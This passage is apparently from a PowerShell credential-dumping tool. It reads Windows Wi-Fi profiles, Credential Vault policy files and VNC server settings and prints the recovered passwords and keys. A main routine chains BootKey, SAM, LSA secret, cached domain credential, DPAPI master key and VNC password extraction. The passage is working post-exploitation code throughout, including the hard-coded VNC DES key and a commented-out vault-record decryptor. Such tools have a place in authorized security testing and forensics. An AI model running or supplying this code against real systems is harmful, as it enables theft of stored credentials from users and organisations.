			$X = $X + 4 + $CRED_ATTRIBUTE["DataLength"]
		}

		return $CREDENTIAL_BLOB
	}
	Else
	{
		Write-Host ("[-] No MasterKey found to decrypt CredentialFile")
		return $Null
	}
}

### Find DPAPI secrets and try to decrypt them ###

function Get-WiFiPwds($MasterKeys)
{
	<#
		Get-WiFiPwds: With System MasterKeys we can always decrypt Wi-Fi pwds
			- Encrypted password for each Wireless interface and each SSID is located at C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<IDForWirelessInterface>\<IDForSSID>.xml
	#>
	Write-Host ("`n[===] Searching Wi-Fi pwds and decrypt them with System's Master Keys")

	If (Test-Path "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*\*")
	{
		ForEach ($Child in (Get-ChildItem -Path "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*\*"))
		{
			$FileName = $Child.FullName
			If (($FileName).Substring(($FileName.Length-4), 4) -eq ".xml")
			{
				$Content = Get-Content $FileName -Raw
				$Name1 = $Content.IndexOf("<name>")
				If ($Name1 -ne -1)
				{
					$Name2 = $Content.IndexOf("</name>")
					$SSID = $Content.Substring($Name1 + 6, $Name2 - ($Name1 + 6))

					$KeyMaterial1 = $Content.IndexOf("<keyMaterial>")
					If ($KeyMaterial1 -ne -1)
					{
						$KeyMaterial2 = $Content.IndexOf("</keyMaterial>")
						$EncHexBlob = $Content.Substring($KeyMaterial1 + 13, $KeyMaterial2 - ($KeyMaterial1 + 13))
						$EncBlob = HexStringToBytes $EncHexBlob
						$BytesKey = Decrypt-DPAPIBlob $EncBlob $MasterKeys $Null
						If ($BytesKey)
						{
							$StringKey = [System.Text.Encoding]::ASCII.GetString($BytesKey)
							Write-Host ("[+] Key for SSID {0} = {1}" -f ($SSID, $StringKey))
						}
						Else
						{
							Write-Host ("[-] No MasterKey found for decrypting key for SSID {0}" -f ($SSID))
						}
					}
					Else
					{
						Write-Host ("[-] No key found for SSID {0}" -f ($SSID))
					}
				}
			}
		}
	}
	Else { Write-Host "[+] No Wi-Fi pwds configured" }
}

function Get-CredentialVaultManager($MasterKeys)
{
	<#
		Get-CredentialVaultManager:
			1- Find all VPOL files and try to decrypt them with gathered MasterKeys
			2- From decrypted VPOL files we get two keys for each
			3- Find all VCRD files and try to decrypt them with each keys gained from VPOL files
	#>
	
	Write-Host ("`n[===] Search VPOL and VCRD Files and decrypt them")
	
	$VPOLPaths = @()
	ForEach ($User in (Get-ChildItem "C:\Users" -Force))
	{
		ForEach ($Subfolder in ("Local", "Roaming", "LocalLow"))
		{
			$Path = "C:\Users\$User\AppData\$Subfolder\Microsoft\Vault"
			If (Test-Path $Path)
			{
				ForEach ($Item in (Get-ChildItem $Path -Force))
				{
					If ($Item -Match "[A-Za-z0-9]*-[A-Za-z0-9]*-[A-Za-z0-9]*[A-Za-z0-9]*-[A-Za-z0-9]*")
					{
						If (Test-Path "$Path\$Item\Policy.vpol")
						{
							$VPOLPaths += ,("$Path\$Item\Policy.vpol")
						}
					}
				}
			}
		}
	}
	If (Test-Path "C:\ProgramData\Microsoft\Vault")
	{
		ForEach ($Item in (Get-ChildItem "C:\ProgramData\Microsoft\Vault" -Force))
		{
			If ($Item -Match "[A-Za-z0-9]*-[A-Za-z0-9]*-[A-Za-z0-9]*[A-Za-z0-9]*-[A-Za-z0-9]*")
			{
				If (Test-Path "C:\ProgramData\Microsoft\Vault\$Item\Policy.vpol")
				{
					$VPOLPaths += ,("C:\ProgramData\Microsoft\Vault\$Item\Policy.vpol")
				}
			}
		}
	}
	If (Test-Path "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault")
	{
		ForEach ($Item in (Get-ChildItem "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault" -Force))
		{
			If ($Item -Match "[A-Za-z0-9]*-[A-Za-z0-9]*-[A-Za-z0-9]*[A-Za-z0-9]*-[A-Za-z0-9]*")
			{
				If (Test-Path "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault\$Item\Policy.vpol")
				{
					$VPOLPaths += ,("C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault\$Item\Policy.vpol")
				}
			}
		}
	}
	
	$VPOLKeys = @()
	ForEach ($VPOLPath in $VPOLPaths)
	{
		$VPOLBytes = [System.IO.File]::ReadAllBytes($VPOLPath)
		
		# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_VPOL
		$Version = [BitConverter]::ToInt32($VPOLBytes[0..3], 0)
		$MKGUID1 = MKGUID $VPOLBytes[4..19]
		$DescriptionLength = [BitConverter]::ToInt32($VPOLBytes[20..23], 0)
		$X = 24
		$Y = $X + $DescriptionLength
		$Description = $VPOLBytes[$X..($Y-1)]
		$X = $Y
		$Y = $X + 12
		$Unknown0 = $VPOLBytes[$X..($Y-1)]
		$X = $Y
		$Y = $X + 4
		$Size = [BitConverter]::ToInt32($VPOLBytes[$X..($Y-1)], 0)
		$X = $Y
		$Y = $X + 16
		$MKGUID2 = MKGUID $VPOLBytes[$X..($Y-1)]
		$X = $Y
		$Y = $X + 16
		$MKGUID3 = MKGUID $VPOLBytes[$X..($Y-1)]
		$X = $Y
		$Y = $X + 4
		$KeySize = [BitConverter]::ToInt32($VPOLBytes[$X..($Y-1)], 0)
		$X = $Y
		$Y = $X + $KeySize
		$DPAPIBlob = $VPOLBytes[$X..($Y-1)]
		$VPOLDecrypted = Decrypt-DPAPIBlob $DPAPIBlob $MasterKeys $Null
		If ($VPOLDecrypted)
		{
			Write-Host ("[+] VPOL File {0} decrypted" -f ($VPOLPath))
			For ($i = 0; $i -lt 2; $i += 1)
			{
				# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_VPOL_KEYS
				If (($VPOLDecrypted[0] -eq [byte]36) -or ($VPOLDecrypted[0] -eq [byte]52))
				{
					# Structure from Pypykatz DPAPI/Structures/Vault : KDBM
					$Size = [BitConverter]::ToInt32($VPOLDecrypted[0..3], 0)
					$Version = [BitConverter]::ToInt32($VPOLDecrypted[4..7], 0)
					$Unknown0 = [BitConverter]::ToInt32($VPOLDecrypted[8..11], 0)
					
					# Structure from Pypykatz DPAPI/Structures/Vault : BCRYPT_KEY_DATA_BLOB_HEADER
					$BCRYPT_KEY_DATA_BLOB_HEADER = $VPOLDecrypted[12..(12+$Size-8)]
					$Magic = [BitConverter]::ToInt32($BCRYPT_KEY_DATA_BLOB_HEADER[0..3], 0)
					$Version = [BitConverter]::ToInt32($BCRYPT_KEY_DATA_BLOB_HEADER[4..7], 0)
					$KeyData = [BitConverter]::ToInt32($BCRYPT_KEY_DATA_BLOB_HEADER[8..11], 0)
					$Key = $BCRYPT_KEY_DATA_BLOB_HEADER[12..(12+$KeyData-1)]
					$HexKey = [System.BitConverter]::ToString($Key).Replace("-", "")
					$VPOLKeys += ,($Key)
					Write-Host ("[...] Found VPOL Key = {0}" -f ($HexKey))
					
					$VPOLDecrypted = $VPOLDecrypted[(12+$Size-8)..($VPOLDecrypted.Length-1)]
				}
				Else
				{
					# Structure from Pypykatz DPAPI/Structures/Vault : KSSM
					$Size = [BitConverter]::ToInt32($VPOLDecrypted[0..3], 0)
					$Version = [BitConverter]::ToInt32($VPOLDecrypted[4..7], 0)
					$Unknown0 = [BitConverter]::ToInt32($VPOLDecrypted[8..11], 0)
					$Key = $VPOLDecrypted[12..(12+$Size-8)]
					$HexKey = [System.BitConverter]::ToString($Key).Replace("-", "")
					$VPOLKeys += ,($Key)
					Write-Host ("[...] Found VPOL Key = {0}" -f ($HexKey))
					
					$VPOLDecrypted = $VPOLDecrypted[(12+$Size-8)..($VPOLDecrypted.Length-1)]
				}
			}
		}
		Else
		{
			Write-Host ("[-] Unable to decrypt VPOL File {0} with all MasterKeys" -f ($VPOLPath))
		}
	}
	
	<# Unable to find valid VCRD files
	$VCRDPaths = @()
	ForEach ($User in (Get-ChildItem "C:\Users" -Force))
	{
		ForEach ($Subfolder in ("Local", "Roaming", "LocalLow"))
		{
			$Path = "C:\Users\$User\AppData\$Subfolder\Microsoft\Credentials"
			If (Test-Path $Path)
			{
				ForEach ($Item in (Get-ChildItem $Path -Force))
				{
					If ($Item -Match "[A-Za-z0-9]{32}")
					{
						$VCRDPaths += ,("$Path\$Item")
					}
				}
			}
		}
	}
	If (Test-Path "C:\ProgramData\Microsoft\Credentials")
	{
		ForEach ($Item in (Get-ChildItem "C:\ProgramData\Microsoft\Credentials" -Force))
		{
			If ($Item -Match "[A-Za-z0-9]{32}")
			{
				If (Test-Path "C:\ProgramData\Microsoft\Credentials\$Item")
				{
					$VCRDPaths += ,("C:\ProgramData\Microsoft\Credentials\$Item")
				}
			}
		}
	}
	If (Test-Path "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials")
	{
		ForEach ($Item in (Get-ChildItem "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials" -Force))
		{
			If ($Item -Match "[A-Za-z0-9]{32}")
			{
				If (Test-Path "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\$Item")
				{
					$VCRDPaths += ,("C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\$Item")
				}
			}
		}
	}
	
	ForEach ($VCRDPath in $VCRDPaths)
	{
		Write-Host ("[+] Decrypt VCRD File {0} with VPOL Keys" -f ($VCRDPath))
		$VCRDBytes = [System.IO.File]::ReadAllBytes($VCRDPath)
		
		# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_VCRD
		$SchemaMKGUID = MKGUID $VCRDBytes[0..15]
		$Unknown0 = [BitConverter]::ToInt32($VCRDBytes[16..19], 0)
		$LastWritten = [BitConverter]::ToInt32($VCRDBytes[20..27], 0)
		$Unknown1 = $VCRDBytes[28..31]
		$Unknown2 = $VCRDBytes[32..35]
		$FriendlyName_Length = [BitConverter]::ToInt32($VCRDBytes[36..39], 0)
		$X = 40
		$Y = $X + $FriendlyName_Length
		$FriendlyName = $VCRDBytes[$X..($Y-1)]
		If ($FriendlyName_Length -gt 0)
		{
			$FriendlyName = [System.Text.Encoding]::Unicode.GetString($FriendlyName)
			Write-Host ("[...] Friendly name = {0}" -f ($FriendlyName))
		}
		Else { Write-Host "[...] Friendly name = <Empty>" }
		$X = $Y
		$Y = $X + 4
		$AttributeMaps_Length = [BitConverter]::ToInt32($VCRDBytes[$X..($Y-1)], 0)
		$X = $Y
		$Y = $X + $AttributeMaps_Length
		$AttributeMaps = $VCRDBytes[$X..($Y-1)]
		
		$DB = $AttributeMaps
		$Vames = @()
		For ($i = 0; $i -lt [System.Math]::Floor($AttributeMaps_Length / 12); $i += 1)
		{
			$Vame = @{}
			
			# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_ATTRIBUTE_MAP_ENTRY
			$Vame["ID"] = [BitConverter]::ToInt32($DB[0..3], 0)
			$Vame["Offset"] = [BitConverter]::ToInt32($DB[4..7], 0)
			$Unknown = [BitConverter]::ToInt32($DB[8..11], 0)
			$Vames += ,($Vame)
			
			$DB = $DB[12..($DB.Length-1)]
		}
		
		$Attributes = @()
		For ($i = 0; $i -lt $Vames.Length-1; $i += 1)
		{
			$Data = $VCRDBytes[($Vames[$i]["Offset"])..($Vames[$i+1]["Offset"] - $Vames[$i]["Offset"])]
			
			$Attribute = @{}
			# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_ATTRIBUTE
			$Size = $Data.Length
			$Attribute["ID"] = [BitConverter]::ToInt32($Data[0..3], 0)
			$Unknown0 = $Data[4..7]
			$Unknown1 = $Data[8..11]
			$Unknown2 = $Data[12..15]
			
			If ($Size -gt 20)
			{
				$Test = $Data[16..21]
				If (@(Compare-Object $Test ((,[byte]0) * 6) -SyncWindow 0).Length -eq 0) { $Attribute["Padding"] = $Test }
				
				$X = 16
				If ($ID -ge 100) { $Unknown3 = $Data[$X..19]; $X = 20 }
			}
			
			If ($Size -gt 25)
			{
				$Y = $X + 4
				$Attribute["Size"] = [BitConverter]::ToInt32($Data[$X..($Y-1)], 0)
				$X = $Y
				$Attribute["IVPresent"] = $Data[$X]
				$X = $X + 1
				If ($Attribute["IVPresent"])
				{
					$Y = $X + 4
					$Attribute["IVSize"] = [BitConverter]::ToInt32($Data[$X..($Y-1)], 0)
					$X = $Y
					$Y = $X + $Attribute["IVSize"]
					$Attribute["IV"] = $Data[$X..($Y-1)]
					$X = $Y
					$Y = $X + ($Attribute["Size"] - ($Attribute["IVSize"] + 5))
					$Attribute["Data"] = $Data[$X..($Y-1)]
				}
				Else
				{
					$Y = $X + $Attribute["Size"] - 1
					$Attribute["Data"] = $Data[$X..($Y-1)]
				}
			}
			
			$Attributes += ,($Attribute)
		}
		$X = $Vames[$Vames.Length-1]["Offset"]
		$Data = $VCRDBytes[$X..($VCRDBytes.Length-1)]
		$Attribute = @{}
		# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_ATTRIBUTE
		$Size = $Data.Length
		$Attribute["ID"] = [BitConverter]::ToInt32($Data[0..3], 0)
		$Unknown0 = $Data[4..7]
		$Unknown1 = $Data[8..11]
		$Unknown2 = $Data[12..15]
		
		If ($Size -gt 20)
		{
			$Test = $Data[16..21]
			If (@(Compare-Object $Test ((,[byte]0) * 6) -SyncWindow 0).Length -eq 0) { $Attribute["Padding"] = $Test }
			
			$X = 16
			If ($ID -ge 100) { $Unknown3 = $Data[$X..19]; $X = 20 }
		}
		
		If ($Size -gt 25)
		{
			$Y = $X + 4
			$Attribute["Size"] = [BitConverter]::ToInt32($Data[$X..($Y-1)], 0)
			$X = $Y
			$Attribute["IVPresent"] = $Data[$X]
			$X = $X + 1
			If ($Attribute["IVPresent"])
			{
				$Y = $X + 4
				$Attribute["IVSize"] = [BitConverter]::ToInt32($Data[$X..($Y-1)], 0)
				$X = $Y
				$Y = $X + $Attribute["IVSize"]
				$Attribute["IV"] = $Data[$X..($Y-1)]
				$X = $Y
				$Y = $X + ($Attribute["Size"] - ($Attribute["IVSize"] + 5))
				$Attribute["Data"] = $Data[$X..($Y-1)]
			}
			Else
			{
				$Y = $X + $Attribute["Size"] - 1
				$Attribute["Data"] = $Data[$X..($Y-1)]
			}
		}
		$Attributes += ,($Attribute)
		
		ForEach ($VPOLKey in $VPOLKeys)
		{
			Write-Host ("[...] Decrypt VCRD File Attributes with VPOL Key {0}" -f ([System.BitConverter]::ToString($VPOLKey).Replace("-", "")))
			ForEach ($Attribute in $Attributes)
			{
				If ($Attribute["Data"])
				{
					If ($Attribute["IV"])
					{
						$ClearTextBytes = AESTransform $VPOLKey $Attribute["Data"] $Attribute["IV"] $False
						Write-Host ("[......] Attribute may be = {0}" -f ([Text.Encoding]::Unicode.GetString($ClearTextBytes)))
					}
					Else
					{
						$ClearTextBytes = AESTransform $VPOLKey $Attribute["Data"] ((,[byte]0) * 16) $False
						Write-Host ("[......] Attribute may be = {0}" -f ([Text.Encoding]::Unicode.GetString($ClearTextBytes)))
					}
				}
			}
		}
	}
	#>
}

function Get-DPAPISecrets($MasterKeys)
{
	<#
		Get-DPAPISecrets: Get DPAPI Secrets and try to decrypt them with MasterKeys
			- Decrypting Wi-Fi passwords required System Master Keys thus It always succeed
			- Decrypting VPOL Files with System and User MasterKeys -> Two VPOL Keys for each VPOL File decrypted -> Decrypt VCRD Files with VPOL Keys
	#>
	
	Get-WiFiPwds $MasterKeys
	Get-CredentialVaultManager $MasterKeys
}

<#################>
<# VNC Passwords #>
<#################>

function DecryptVNCPwd($Key, $PwdBytes)
{
	<#
		DecryptVNCPwd:
			- Get blocks of 64 bits from password bytes
				- If password bytes < 8: Padd to 8 bytes with null bytes
				- If password bytes > 8 and not divisble by 8: Truncate to 8 bytes
			- Apply DES Encryption on each block :  Block = 64 bits, Key = 64 bits, IV = \x00 * 8, Mode = "CBC"
			- Remove bytes after first null byte
	#>
	
	$ClearTextBytes = @()

	If ($PwdBytes.Length -lt 8)
	{
		$PwdBytes += (,[byte]0) * (8 - $PwdBytes.Length)
	}
	ElseIf ($PwdBytes.Length -gt 8)
	{
		If (($PwdBytes.Length % 8) -ne 0)
		{
			Write-Host ("[WARNING] Decrypted pwd will be truncated to 8 bytes (Encrypted pwd length > 8 and not divisible by 8)")
			$PwdBytes = $PwdBytes[0..7]
		}
	}
		
	For ($i = 0; $i -lt $PwdBytes.Length; $i += 8)
	{
		$Block = $PwdBytes[$i..($i+8-1)]
		If ($Block.Length -lt 8) { $Block += (,[byte]0) * (8 - $Block.Length) }
		
		$ClearTextBytes += DESTransform $Key $Block ((,[byte]0) * 8) $False
	}

	$FirstNullByteIndex = $ClearTextBytes.IndexOf([byte]0)
	If ($FirstNullByteIndex -gt 0)
	{
		$ClearTextBytes = $ClearTextBytes[0..($FirstNullByteIndex)]
	}

	return $ClearTextBytes
}

function Get-VNCPwds()
{
	<#
		Get-VNCPwds: Get Hex Encoded VNC passwords from registries or files (depending on VNC server), and decrypt them with same VNC Secret Key
	#>
	
	Write-Host ("`n[===] Searching VNC pwds and decrypt them with same VNC Secret Key")
	
	$RegPaths = @("HKLM:SOFTWARE\RealVNC\vncserver", "HKLM:SOFTWARE\TightVNC\Server", "HKLM:SOFTWARE\Wow6432Node\TightVNC\Server", "HKLU:SOFTWARE\TigerVNC\WinVNC4")
	$FilePaths = @("$Env:Programfiles\UltraVNC\ultravnc.ini", "$Env:Programfiles (x86)\UltraVNC\ultravnc.ini", "$Env:Programfiles\Uvnc Bvba\UltraVNC\ultravnc.ini", "$Env:Programfiles (x86)\Uvnc Bvba\UltraVNC\ultravnc.ini")
	$Pwds = @()
	$FindOne = $False
	
	# Same VNC Secret Key used for different VNC Server 
	$VNCKey = @(0xe8, 0x4a, 0xd6, 0x60, 0xc4, 0x72, 0x1a, 0xe0)
	
	ForEach ($RegPath in $RegPaths)
	{
		If (Test-Path $RegPath)
		{
			$Reg = Get-Item "$RegPath"
			ForEach ($Key in ("Password", "ControlPassword", "PasswordViewOnly"))
			{
				$PwdEncryptedBytes = $Reg.GetValue($Key)
				If ($PwdEncryptedBytes)
				{
					$FindOne = $True
					$ClearTextBytes = DecryptVNCPwd $VNCKey $PwdEncryptedBytes
					$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
					
					Write-Host ("[+] Decrypted {0} = {1}" -f ("$RegPath\$Key", $ClearText))
				}
			}
		}
	}
	ForEach ($FilePath in $FilePaths)
	{
		If (Test-Path $FilePath)
		{
			ForEach ($Line in (Get-Content $FilePath))
			{
				ForEach ($Key in ("passwd", "passwd2"))
				{
					If ($Line -match $Key)
					{
						$HexStringPwd = ($Line.Split("="))[1]
						If ($HexStringPwd)
						{
							$FindOne = $True
							$PwdEncryptedBytes = HexStringToBytes $HexStringPwd
							$ClearTextBytes = DecryptVNCPwd $VNCKey $PwdEncryptedBytes
							$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
								
							Write-Host ("[+] Decrypted {0} = {1}" -f ($FilePath, $ClearText))
						}
					}
				}
			}
		}
	}
	
	If (-not ($FindOne)) { Write-Host "[-] No VNC pwds found" }
}


<########>
<# MAIN #>
<########>

function Get-WindowsSecrets()
{
	<#
		Get-WindowsSecrets: Call to functions to get Windows Secrets (BootKey, SAM, LSA Secrets, Cached Domain Creds, DPAPI Secrets, VNC pwds)
			- For DPAPI Secrets, It is very slow for MasterKeys decryption, you can skip with -SkipDPAPI parameter
	#>
	Param(
		[Parameter(Mandatory=$False)][String]$Creds,	# Format = <UserName1>:<Pwd1>/<UserName2>:<Pwd2>/...
		[Parameter(Mandatory=$False)][String]$NTHashes,	# Format = <UserName1>:<HexNTH1>/<UserName2>:<HexNTH2>/...
		[Parameter(Mandatory=$False)][Boolean]$SkipDPAPI
		)
	
	$BootKey = Get-BootKey
	$SAM = Get-SAM $BootKey

	$LSASecretKey = Get-LSASecretKey $BootKey
	$LSASecrets = Get-LSASecrets $LSASecretKey

	$NLKM = $LSASecrets['NL$KM']["CurrVal"]
	$CachedDomainCreds = Get-CachedDomainCreds $NLKM
	
	If (-not ($SkipDPAPI))
	{
		# Get potential creds or NT hashes for PreKeys calculations (DPAPI)
		$Pwds = @()
		If ($Creds)
		{
			$Accounts = $Creds -Split "/"
			ForEach ($Account in $Accounts)
			{
				$User, $Pwd = $Account -Split ":"
				$SID = ((New-Object System.Security.Principal.NTAccount($User)).Translate([System.Security.Principal.SecurityIdentifier])).Value
				
				$X = @{}
				$X[$SID] = $Pwd
				$Pwds += ,($X)
			}
		}
		
		$NTHs = @()
		If ($NTHashes)
		{
			$Accounts = $NTHashes -Split "/"
			ForEach ($Account in $Accounts)
			{
				$User, $HexNTH = $Account -Split ":"
				$SID = ((New-Object System.Security.Principal.NTAccount($User)).Translate([System.Security.Principal.SecurityIdentifier])).Value
				
				$X = @{}
				$X[$SID] = HexStringToBytes($HexNTH)
				$NTHs += ,($X)
			}
		}
	
		$LSA_DPAPI_SYSTEM = $LSASecrets["DPAPI_SYSTEM"]["CurrVal"]
		$MasterKeys = Get-MasterKeysFromFiles $LSA_DPAPI_SYSTEM $SAM $Pwds $NTHs
		Get-DPAPISecrets $MasterKeys
	}
	
	Get-VNCPwds
	
	Write-Host ""
}
